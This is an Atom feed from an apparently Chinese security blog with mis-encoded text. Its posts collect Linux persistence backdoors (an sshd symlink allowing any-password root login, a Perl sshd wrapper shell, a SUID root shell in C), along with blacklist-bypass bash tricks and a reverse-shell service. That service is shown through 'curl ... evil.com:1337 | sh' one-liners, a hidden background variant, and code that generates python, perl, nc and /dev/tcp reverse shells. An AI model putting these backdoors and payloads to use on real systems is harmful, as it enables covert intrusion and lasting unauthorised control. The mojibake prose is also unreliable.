<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ukonwho.github.io</id>
    <title>å¥‡æ€ªçš„çŸ¥è¯†</title>
    <updated>2020-08-26T02:59:43.183Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ukonwho.github.io"/>
    <link rel="self" href="https://ukonwho.github.io/atom.xml"/>
    <subtitle>å¥‡æ€ªçš„çŸ¥è¯†å•å¢åŠ äº†</subtitle>
    <logo>https://ukonwho.github.io/images/avatar.png</logo>
    <icon>https://ukonwho.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, å¥‡æ€ªçš„çŸ¥è¯†</rights>
    <entry>
        <title type="html"><![CDATA[Linuxå¸¸è§çš„æŒä¹…åŒ–åé—¨æ±‡æ€»]]></title>
        <id>https://ukonwho.github.io/post/linux-chang-jian-de-chi-jiu-hua-hou-men-hui-zong/</id>
        <link href="https://ukonwho.github.io/post/linux-chang-jian-de-chi-jiu-hua-hou-men-hui-zong/">
        </link>
        <updated>2020-06-11T01:55:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00å‰è¨€">0x00:å‰è¨€</h2>
<p>æŒä¹…åŒ–åé—¨æ˜¯æŒ‡å½“å…¥ä¾µè€…é€šè¿‡æŸç§æ‰‹æ®µæ‹¿åˆ°æœåŠ¡å™¨çš„æ§åˆ¶æƒä¹‹å,é€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šæ”¾ç½®ä¸€äº›åé—¨(è„šæœ¬ã€è¿›ç¨‹ã€è¿æ¥ä¹‹ç±»),æ¥æ–¹ä¾¿ä»–ä»¥åæŒä¹…æ€§çš„å…¥ä¾µ,ç®€å•æ¢³ç†ä¸€ä¸‹æ—¥å¸¸é‡è§windowsç”¨çš„æ¯”è¾ƒå¤šçš„ä¸€äº›æŒä¹…åŒ–æ–¹å¼æ–¹ä¾¿ä»¥åæ’æŸ¥é—®é¢˜ä½¿ç”¨.</p>
<h2 id="0x01ssh">0x01:SSH</h2>
<h3 id="ä¸€-sshè½¯è¿æ¥">ä¸€ã€sshè½¯è¿æ¥</h3>
<center>SSHè½¯è¿æ¥åé—¨çš„åŸç†</center>
<ol>
<li>Linuxè½¯è¿æ¥sshåé—¨éœ€è¦sshé…ç½®å…è®¸PAMè®¤è¯æ‰èƒ½ä½¿ç”¨</li>
<li>å°†sshdæ–‡ä»¶è½¯è¿æ¥åç§°è®¾ç½®ä¸ºsu,è¿™æ ·åº”ç”¨åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä»–ä¼šå»PAMé…ç½®æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨å¯¹åº”åç§°çš„é…ç½®ä¿¡æ¯(su)</li>
<li>å¦‚æœè¢«æ§ä¸»æœºä¸å…è®¸rootç™»é™†å¯ç”¨å…¶ä»–å·²å­˜åœ¨ç”¨æˆ·ç™»é™†</li>
<li>é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼,å®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å(å¦‚:/tmp/su,/home/su)åœ¨/etc/pam.d/ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚:/etc/pam.d/su)</li>
<li>ä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯auth sufficient pam_rootok.so,åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯ SSHä»»æ„å¯†ç ç™»é™†</li>
</ol>
<center>ä¸¾ä¸ªæ —å­</center>
<center>é¶æœºæ‰§è¡Œå¹¶æŸ¥çœ‹æ˜¯å¦è½¯è¿æ¥å»ºç«‹å®Œæˆ</center>
<pre><code class="language-bash">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
</code></pre>
<p>è¯´æ˜:å»ºç«‹è½¯è¿æ¥åˆ°/usr/local/su æ–‡ä»¶,ä¹Ÿå¯ä»¥åœ¨å…¶ä»–ç›®å½•,suæ–‡ä»¶åå­—ä¸èƒ½å˜,å˜äº†å°±æ— æ³•ç™»å½•.å½“ç„¶å¯ä»¥é€šè¿‡å…¶ä»–è®¾ç½®,æ›´æ”¹suåå­—ä¹Ÿæ˜¯å¯ä»¥çš„.ç„¶åå¯åŠ¨,å¹¶æŒ‡å®šç›‘å¬12345ç«¯å£,ç™»å½•çš„æ—¶å€™å¯†ç éšæ„å³å¯.</p>
<center>æ”»å‡»è€…åˆ©ç”¨sshå¹¶ä½¿ç”¨ä»»æ„å¯†ç ç™»é™†é¶æœº</center>
<pre><code class="language-bash">ssh root@1xx.1xx.1xx.1xx -p 12345
</code></pre>
<p>å‚è€ƒ:https://www.jozxing.cc/archives/1653</p>
<h3 id="äºŒ-sshåˆ©ç”¨å…¬é’¥å…å¯†ç™»å½•">äºŒã€sshåˆ©ç”¨å…¬é’¥å…å¯†ç™»å½•</h3>
<p><strong>å—å®³è€…</strong>:1.1.1.x<br>
<strong>æ”»å‡»è€…</strong>:2.2.2.x<br>
ç°åœ¨æ”»å‡»è€…æƒ³é…ç½®å…å¯†ç™»å½•è¿æ¥å—å®³è€…</p>
<ol>
<li>
<p>æ”»å‡»è€…æœºå™¨:</p>
<p><code># ssh-keygen -b 4096 -t rsa</code></p>
<p>ä¸€è·¯å›è½¦å›è½¦é»˜è®¤å°±è¡Œ,åœ¨/root/.ssh/ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶<br>
id_rsaã€id_rsa.pub</p>
<p><code># cat /root/.ssh/id_rsa.pub</code></p>
<p>å…¨éƒ¨copyæ–‡ä»¶å†…å®¹</p>
</li>
<li>
<p>å—å®³è€…æœºå™¨ï¼š<br>
<code># vi /root/.ssh/authorized_keys</code></p>
<p>æ”»å‡»è€…çš„id_rsa.pubå†…å®¹ç²˜è´´åˆ°æ–‡ä»¶é‡Œé¢(å¦‚æœåŸæ¥å­˜åœ¨å†…å®¹å°±å¦èµ·ä¸€è¡Œç²˜è´´)<br>
<code># chmod 600 /root/.ssh/authorized_keys</code><br>
<code># chmod 700 /root/.ssh</code></p>
</li>
<li>
<p>æ”»å‡»è€…åˆ©ç”¨å…¬é’¥ç™»å½•<br>
<code># ssh -i /root/.ssh/id_rsa root@2.2.2.x</code></p>
<p><em>ç¼ºç‚¹:å®¹æ˜“è¢«å‘ç°</em></p>
</li>
</ol>
<h3 id="ä¸‰-ssh-wrapperåé—¨">ä¸‰ã€ssh  wrapperåé—¨</h3>
<p>inité¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™,æ­£åˆ™åŒ¹é…ä¼šå¤±è´¥,äºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥,å¯åŠ¨/usr/bin/sshd,è¿™æ˜¯åŸå§‹sshd.</p>
<p>åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥å,ä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œ.è¿™ä¸ªå­è¿›ç¨‹,æ²¡æœ‰ä»€ä¹ˆæ£€éªŒ,è€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshd,è¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†.æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—,getpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£,å¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell.</p>
<ol>
<li>è¢«æ§ç«¯</li>
</ol>
<pre><code class="language-bash">[root@Jaky ~]# cd /usr/sbin
[root@Jaky sbin]# mv sshd ../bin
[root@Jaky sbin]# echo â€˜#!/usr/bin/perlâ€™ &gt;sshd
[root@Jaky sbin]# echo â€˜exec â€œ/bin/shâ€ if(getpeername(STDIN) =~ /^..4A/);â€™ &gt;&gt;sshd
[root@Jaky sbin]# echo â€˜exec{â€œ/usr/bin/sshdâ€} â€œ/usr/sbin/sshdâ€,@ARGV,â€™ &gt;&gt;sshd
[root@Jaky sbin]# chmod u+x sshd
[root@Jaky sbin]# /etc/init.d/sshd restart
</code></pre>
<ol start="2">
<li>æ§åˆ¶ç«¯<br>
<code>socat STDIOTCP4:å—å®³è€…IP:22,sourceport=19526</code></li>
</ol>
<p>ä¼˜ç‚¹:</p>
<ul>
<li>éšè”½æ€§è¾ƒå¼º,æ— éœ€è¦ç¼–è¯‘,ä½¿ç”¨äºå¤§éƒ¨åˆ†ç¯å¢ƒä¸­.</li>
<li>åœ¨æ— è¿æ¥åé—¨çš„æƒ…å†µä¸‹,ç®¡ç†å‘˜æ˜¯çœ‹ä¸åˆ°ç«¯å£å’Œè¿›ç¨‹çš„,lastä¹ŸæŸ¥ä¸åˆ°ç™»é™†.</li>
</ul>
<p>ç¼ºç‚¹:</p>
<ul>
<li>éœ€è¦é‡å¯sshdè¿›ç¨‹.</li>
</ul>
<h3 id="å››-crontabå®šæ—¶ä»»åŠ¡">å››ã€Crontabå®šæ—¶ä»»åŠ¡</h3>
<p>Crontabå®šæ—¶ä»»åŠ¡å°±åƒwindowsä¸­çš„å®šæ—¶ä»»åŠ¡,åœ¨Linuxç³»ç»Ÿä¸­,è®¡åˆ’ä»»åŠ¡ä¸€èˆ¬æ˜¯ç”±cronæ‰¿æ‹…,æˆ‘ä»¬å¯ä»¥æŠŠcronè®¾ç½®ä¸ºå¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨.<br>
Cron è¡¨è¾¾å¼ç”Ÿæˆç½‘ç«™ï¼šhttps://qqe2.com/cron</p>
<h2 id="0x02suidåé—¨">0x02:SUIDåé—¨</h2>
<p>å½“sè¿™ä¸ªæ ‡å¿—å‡ºç°åœ¨æ–‡ä»¶æ‰€æœ‰è€…çš„xæƒé™ä¸Šæ—¶,æ­¤æ—¶å°±è¢«ç§°ä¸ºSet UID.ç®€ç¨‹SUID.<br>
å½“ä¸€ä¸ªæ–‡ä»¶æˆ–è€…ç¨‹åºæ‰€å± suidä¸º0æ—¶,é‚£ä¹ˆå®ƒçš„å½’å±åŠä¸ºroot,å½“æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶,å…¶å®æ˜¯ä»¥rootèº«ä»½æ‰§è¡Œçš„.<br>
å¿…è¦æ¡ä»¶ï¼š</p>
<ol>
<li>SUIDæƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆã€‚</li>
<li>æ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºéœ€è¦å…·æœ‰xçš„å¯æ‰§è¡Œæƒé™</li>
<li>æœ¬æƒé™ä»…åœ¨æ‰§è¡Œè¯¥ç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ</li>
<li>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œè€…å°†å…·æœ‰è¯¥ç¨‹åºæ‹¥æœ‰è€…çš„æƒé™</li>
</ol>
<p>ä¸¾ä¸ªæ —å­</p>
<pre><code class="language-c">#include&lt;stdlib.h&gt;
main () {
setuid(0);
system(&quot;/bin/bash&quot;);
}
</code></pre>
<pre><code class="language-bash">ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶
gcc suid.c -o luomiweixiong
èµ‹äºˆsuidæƒé™
chmod 4755 luomiweixiong
chmod u+s luomiweixiong
å‡è®¾webshellæƒé™è¾ƒä½ï¼Œå¸Œæœ›ä½¿ç”¨suid shellæ‰§è¡Œrootå‘½ä»¤ï¼Œé€šè¿‡webçš„æ–¹å¼è°ƒç”¨
http://localhost/suid.php?path=/tmp/luomiweixiong&amp;cmd=id
å³å¯ä»¥rootçš„æƒé™æ‰§è¡Œå‘½ä»¤id
</code></pre>
<p>å‚è€ƒ: https://pythonpig.github.io/2018/06/26/suid%E5%90%8E%E9%97%A8(suid-shell)/</p>
<h2 id="0x03åè®®åé—¨">0x03:åè®®åé—¨</h2>
<p>åœ¨ä¸€äº›è®¿é—®æ§åˆ¶åšçš„æ¯”è¾ƒä¸¥æ ¼çš„ç¯å¢ƒä¸­,ç”±å†…åˆ°å¤–çš„TCPæµé‡ä¼šè¢«é˜»æ–­æ‰.ä½†æ˜¯å¯¹äºUDP(DNSã€ICMP)ç›¸å…³æµé‡é€šå¸¸ä¸ä¼šæ‹¦æˆª.<br>
ä¸»è¦åŸç†å°±æ˜¯åˆ©ç”¨ICMPä¸­å¯æ§çš„dataå­—æ®µè¿›è¡Œæ•°æ®ä¼ è¾“<br>
Githubä¸Šçš„åè®®åé—¨åˆ©ç”¨: https://github.com/andreafabrizi/prism</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bash å°æŠ€å·§ï¼ˆä¸€ï¼‰]]></title>
        <id>https://ukonwho.github.io/post/bash-xiao-ji-qiao/</id>
        <link href="https://ukonwho.github.io/post/bash-xiao-ji-qiao/">
        </link>
        <updated>2020-05-22T08:26:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1-bashè¯»etcpasswdçš„å°æŠ€å·§bypassé»‘åå•å’Œé˜²ç«å¢™">1. Bashè¯»/etc/passwdçš„å°æŠ€å·§ï¼ŒBypassé»‘åå•å’Œé˜²ç«å¢™</h3>
<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590136039079.jpg" alt="" loading="lazy"></figure>
<h3 id="2-æœç´¢æ•æ„Ÿæ–‡ä»¶çš„æŠ€å·§">2. æœç´¢æ•æ„Ÿæ–‡ä»¶çš„æŠ€å·§</h3>
<figure data-type="image" tabindex="2"><img src="https://ukonwho.github.io/post-images/1590136365958.jpg" alt="" loading="lazy"></figure>
<h3 id="3-ä¸èƒ½ä½¿ç”¨chmodçš„æƒ…å†µä¸‹å°è¯•å¤šç§æ‰§è¡Œæ–¹æ³•">3. ä¸èƒ½ä½¿ç”¨chmodçš„æƒ…å†µä¸‹å°è¯•å¤šç§æ‰§è¡Œæ–¹æ³•</h3>
<figure data-type="image" tabindex="3"><img src="https://ukonwho.github.io/post-images/1590136426097.jpg" alt="" loading="lazy"></figure>
<h3 id="4-æ— ç©ºæ ¼æ‰§è¡Œå‘½ä»¤">4. æ— ç©ºæ ¼æ‰§è¡Œå‘½ä»¤</h3>
<figure data-type="image" tabindex="4"><img src="https://ukonwho.github.io/post-images/1590136501429.jpg" alt="" loading="lazy"></figure>
<h3 id="5-bashæ— æ–‡ä»¶æ‰«æ">5. Bashæ— æ–‡ä»¶æ‰«æ</h3>
<figure data-type="image" tabindex="5"><img src="https://ukonwho.github.io/post-images/1590136572505.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å¿«é€Ÿå°è¯•å¤šç§åå¼¹shell]]></title>
        <id>https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/</id>
        <link href="https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/">
        </link>
        <updated>2020-05-22T07:06:17.000Z</updated>
        <content type="html"><![CDATA[<p>Reverse Shell as a Service - https://shell.now.sh</p>
<ul>
<li>é¡¹ç›®åœ°å€ï¼šhttps://github.com/lukechilds/reverse-shell</li>
</ul>
<h2 id="ä½¿ç”¨">ä½¿ç”¨</h2>
<h3 id="1-å¸¸è§„ç”¨æ³•">1. å¸¸è§„ç”¨æ³•</h3>
<pre><code class="language-bash"># é€šè¿‡ipè¿æ¥
curl https://shell.now.sh/192.168.0.69:1337 | sh

# é€šè¿‡ä¸»æœºåè¿æ¥
curl https://shell.now.sh/localhost:1337 | sh

# è¿œç¨‹è¿æ¥ï¼Œå› ä¸ºè¿™æ˜¯åå‘è¿æ¥ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç©¿é€é˜²ç«å¢™å¹¶è¿æ¥åˆ°Internet
# æ‚¨å¯ä»¥åœ¨evil.comä¸Šçš„æœåŠ¡å™¨ä¸Šä¾¦å¬è¿æ¥ï¼Œå¹¶ä»å…·æœ‰å®‰å…¨ç½‘ç»œçš„å†…éƒ¨è·å¾—åå‘shell
curl https://shell.now.sh/evil.com:1337 | sh
</code></pre>
<h3 id="2-ä¿æŒé‡è¿">2. ä¿æŒé‡è¿</h3>
<pre><code class="language-bash">while true; do curl https://shell.now.sh/yourip:1337 | sh; done
</code></pre>
<h3 id="3-ä½œä¸ºåå°è¿›ç¨‹è¿è¡Œ">3. ä½œä¸ºåå°è¿›ç¨‹è¿è¡Œ</h3>
<p>ç»ˆç«¯ä¼šè¯éœ€è¦ä¿æŒæ‰“å¼€çŠ¶æ€ä»¥ä¿æŒåå‘shellè¿æ¥ã€‚</p>
<p>ä»¥ä¸‹å‘½ä»¤å°†åœ¨åå°è¿›ç¨‹ä¸­è¿è¡Œåå‘shellç¨‹åºå¹¶é€€å‡ºç»ˆç«¯ï¼Œåœ¨å—å®³è€…çš„è®¡ç®—æœºä¸Šæ²¡æœ‰æ‰“å¼€çœ‹èµ·æ¥å¯ç–‘çš„ç»ˆç«¯çª—å£ã€‚</p>
<p>ç¡®ä¿åœ¨æ–°çš„ç»ˆç«¯çª—å£ä¸­è¿è¡Œæ­¤å‘½ä»¤ï¼Œå¦åˆ™å°†ä¸¢å¤±ç°æœ‰ä¼šè¯ä¸­çš„ä»»ä½•å·¥ä½œã€‚</p>
<pre><code class="language-bash">sh -c &quot;curl https://shell.now.sh/localhost:1337 | sh -i &amp;&quot; &amp;&amp; exit
</code></pre>
<h2 id="æ¼”ç¤º">æ¼”ç¤º</h2>
<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590131423766.gif" alt="" loading="lazy"></figure>
<h2 id="å…³é”®ä»£ç ">å…³é”®ä»£ç </h2>
<pre><code class="language-javascript">'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generateScript = (host, port) =&gt; {
	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;${host}&quot;,${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'`,
		perl: `perl -e 'use Socket;$i=&quot;${host}&quot;;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ${host} ${port} &gt;/tmp/f`,
		sh: `/bin/sh -i &gt;&amp; /dev/tcp/${host}/${port} 0&gt;&amp;1`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) =&gt; {
		script += `
if command -v ${cmd} &gt; /dev/null 2&gt;&amp;1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req =&gt; {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host &amp;&amp; port &amp;&amp; generateScript(host, port));
};

module.exports = reverseShell;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[New beginning]]></title>
        <id>https://ukonwho.github.io/post/new-begining/</id>
        <link href="https://ukonwho.github.io/post/new-begining/">
        </link>
        <updated>2020-05-21T16:00:00.000Z</updated>
        <content type="html"><![CDATA[<p>ğŸ˜˜ Enjoy~</p>
]]></content>
    </entry>
</feed>